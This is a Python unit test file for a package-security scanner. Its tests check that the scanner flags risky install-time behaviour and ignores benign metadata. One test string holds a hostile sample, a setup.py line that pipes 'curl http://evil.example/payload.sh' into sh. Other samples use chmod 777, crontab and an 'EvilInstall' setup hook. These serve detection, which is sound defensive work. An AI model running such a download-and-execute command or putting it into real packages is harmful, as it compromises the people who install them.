import unittest

from auditor.scanner import _scan_content, _scan_python_metadata_file, _extract_referenced_script_paths


class ScannerPatternTests(unittest.TestCase):
    def test_detects_network_and_exec_behavior(self):
        content = "import os\nos.system('curl http://evil.example/payload.sh | sh')\n"
        findings = _scan_content(content, "setup.py")
        descriptions = {f["description"] for f in findings}
        self.assertIn("Shell command execution", descriptions)
        self.assertTrue(any("network" in d.lower() or "download" in d.lower() for d in descriptions))

    def test_detects_permission_and_persistence_behavior(self):
        content = "chmod 777 /tmp/x\ncrontab -l\n"
        findings = _scan_content(content, "postinstall.js")
        descriptions = [f["description"] for f in findings]
        self.assertIn("Permission modification", descriptions)
        self.assertIn("Persistence mechanism", descriptions)

    def test_python_metadata_does_not_flag_plain_homepage_url(self):
        findings = _scan_python_metadata_file('homepage = "https://github.com/example/project"', "pyproject.toml")
        self.assertEqual(findings, [])

    def test_python_metadata_flags_custom_hook(self):
        findings = _scan_python_metadata_file('cmdclass = {"install": EvilInstall}', "setup.cfg")
        self.assertEqual(findings[0]["description"], "Custom setup command hook")

    def test_extracts_referenced_script_paths(self):
        refs = _extract_referenced_script_paths("node scripts/install.js && npm run build", "package/package.json")
        self.assertIn("scripts/install.js", refs)


if __name__ == "__main__":
    unittest.main()
